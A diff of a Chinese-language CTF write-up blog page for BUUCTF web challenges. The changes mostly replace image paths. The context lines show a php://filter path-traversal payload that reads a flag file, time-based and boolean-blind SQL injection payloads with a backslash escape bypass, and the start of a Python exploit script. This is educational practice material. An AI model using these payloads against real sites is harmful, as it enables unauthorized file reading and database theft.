@@ -350,7 +350,7 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://api.btstu.cn/sjbz/?lx=dongman&amp;method=pc&amp;format=images&amp;id=2020011101);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.btstu.cn/sjbz/?lx=dongman&amp;method=pc&amp;format=images&amp;id=2020011101">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
@@ -384,7 +384,7 @@
 <pre><code class="url">http://ed8e3ed8-e966-44c5-b917-7cfb4c276d9f.node3.buuoj.cn/index.php?category=woofers
 http://ed8e3ed8-e966-44c5-b917-7cfb4c276d9f.node3.buuoj.cn/index.php?category=meowers</code></pre>
 <p>查看源代码发现:</p>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200822174952046.png" alt="image-20200822174952046"></p>
+<p><img src="/2020/09/15/BUU-3-wp/1.png" alt="1"></p>
 <p>看到value就try了下xss,传入woofers”</p>
 <p>出现报错:</p>
 <pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  include(woofers&amp;quot;.php): failed to open stream: No such file or directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;37&lt;/b&gt;&lt;br /&gt;
@@ -416,13 +416,13 @@ http://ed8e3ed8-e966-44c5-b917-7cfb4c276d9f.node3.buuoj.cn/index.php?category=me
 <p>接下来尝试利用目录穿越读取flag：</p>
 <p>woofers../../flag</p>
 <p>然后在源代码中发现:</p>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200822175747369.png" alt="image-20200822175747369"></p>
+<p><img src="/2020/09/15/BUU-3-wp/2.png" alt="2"></p>
 <p>这里仔细读代码会发现只要传入的参数中含有woofers、meowers、index即可读取到源代码。</p>
 <p>那就用目录穿越直接读:</p>
 <pre><code class="php">payload：
 category=php://filter/read=convert.base64-encode/resource=woofers../../flag</code></pre>
 <p>最后将base64解码即可:</p>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200822180436152.png" alt="image-20200822180436152"></p>
+<p><img src="/2020/09/15/BUU-3-wp/3.png" alt="3"></p>
 <h2><span id="npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP</span></h2><pre><code class="php">查看源代码发现存在接口:
 ./time.php?source
 访问发现源代码:
@@ -552,7 +552,7 @@ select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and pa
 
 //出题人四级压线才过 见谅见谅 领会精神</code></pre><p>输入用户名密码抓包如下:</p>
 <p>加上单引号:</p>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200827161015818.png" alt="image-20200827161015818"></p>
+<p><img src="/2020/09/15/BUU-3-wp/E:%5Chexo%5Csource_posts%5CBUU-3-wp%5C4.png" alt="image-20200827161015818"></p>
 <p>仔细看提示的sql注入尝试绕过单引号注入:</p>
 <pre><code class="mysql">select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;
 可以看到用户名和密码在同一个语句中，单引号用不了的话就只能将两个部分联通来闭合然后在中间部分执行sql语句。
@@ -563,7 +563,7 @@ password=^+sleep(5)#
 select * from users where username=&#39;admin\&#39; and password=&#39;^ sleep(5)#&#39;;
 相当于:select * from users where username=&#39;admin and password=&#39;^ sleep(5)
 这样执行的sql语句就拼接到了整个查询语句后面就可以执行了。后面就是爆password字段了。</code></pre>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200827160844213.png" alt="image-20200827160844213"></p>
+<p><img src="/2020/09/15/BUU-3-wp/E:%5Chexo%5Csource_posts%5CBUU-3-wp%5C5.png" alt="image-20200827160844213"></p>
 <p>payload：</p>
 <pre><code>username=admin\
 password=^(ascii(substr(password,{},1))&gt;{})#</code></pre><p>尝试编写脚本:</p>
@@ -645,10 +645,10 @@ $result=mysqli_query($con,&quot;select * from images where id=&#39;\&#39; or pat
 当传入\\0会导致第一个\被转义而无法转义后面的单引号。
 </code></pre>
 <p>本地测试了一下:</p>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200830161728526.png" alt="image-20200830161728526"></p>
+<p><img src="/2020/09/15/BUU-3-wp/E:%5Chexo%5Csource_posts%5CBUU-3-wp%5C7.png" alt="image-20200830161728526"></p>
 <p>这样就相当于是双斜杠导致并没能转义后面的单引号。</p>
 <p>这里我接着尝试输入\0’</p>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200830161840751.png" alt="image-20200830161840751"></p>
+<p><img src="/2020/09/15/BUU-3-wp/E:%5Chexo%5Csource_posts%5CBUU-3-wp%5C9.png" alt="image-20200830161840751"></p>
 <p>这次最终得到的是\</p>
 <p>接下来回到题目测试sql注入存在性:</p>
 <p>payload：</p>
@@ -656,7 +656,7 @@ $result=mysqli_query($con,&quot;select * from images where id=&#39;\&#39; or pat
 <p>接下来就很简单的，直接套用的以前的bool盲注的二分法跑。</p>
 <p>这里还需要注意的是，盲注判断正确的时候页面是一个猫的图片，不正确是什么都没有。</p>
 <p>因而判断页面内容需要采用:</p>
-<p><img src="/2020/09/15/BUU-3-wp/C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200830162356461.png" alt="image-20200830162356461"></p>
+<p><img src="/2020/09/15/BUU-3-wp/E:%5Chexo%5Csource_posts%5CBUU-3-wp%5C10.png" alt="image-20200830162356461"></p>
 <p>exp编写如下:</p>
 <pre><code class="python">import requests
 import time
